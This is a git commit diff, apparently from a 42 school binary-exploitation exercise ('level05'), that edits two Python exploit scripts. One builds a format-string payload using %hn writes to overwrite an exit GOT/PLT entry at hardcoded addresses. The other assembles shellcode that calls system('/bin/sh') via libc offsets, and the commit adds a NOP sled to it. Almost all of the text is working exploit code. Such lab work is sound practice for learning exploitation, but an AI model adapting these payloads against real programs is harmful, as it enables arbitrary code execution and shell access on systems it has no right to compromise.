c0315a07e6393cfee03ffa8c77cb1a3b540d9ca5
ppajot <ppajot@student.42.fr>
2024-02-14 19:12:21 +0100

    level05

--- level05/craft_payload.py
+++ level05/craft_payload.py
@@ -2,14 +2,14 @@ import struct
 
 exit_addr1 = 0x080497e0
 exit_addr2 = 0x080497e0 + 2
-first_offset = 0xd903
+first_offset = 0xd153
 second_offset = 0xffff
 
 payload = struct.pack("<I", exit_addr1)
 payload += struct.pack("<I", exit_addr2)
-payload += b"%975x"  # Will print first_offset -18  spaces
+payload += b"%53707x"  # Will print first_offset - 8  spaces
 payload += b"%10$hn"   # Write in the plt tables
-payload += b'%1$64574x'  # Will print second_offset - previous character printed
+payload += b"%11820x"  # Will print second_offset - previous character printed
 payload += b"%11$hn"   # Write in the plt tables
 
 with open('payload', 'wb') as f:
--- level05/generate_shellcode.py
+++ level05/generate_shellcode.py
@@ -3,11 +3,9 @@ import struct
 libc_base_adr = 0xf7e2c000
 system_adr = libc_base_adr + 0x3eed0
 bin_sh_adr = libc_base_adr + 0x15d7ec
-print("addres of system = ", hex(system_adr))
-print("addres of bin_sh = ", hex(bin_sh_adr))
 
 # Create the payload
-payload = b""
+payload = b"\x90" * 2048  # Fill up the buffer with NOPs
 payload += b"\xc7\x04\x24"  # mov_dword
 payload += struct.pack("<I", bin_sh_adr)
 payload += b"\xb8"          # push address on eax
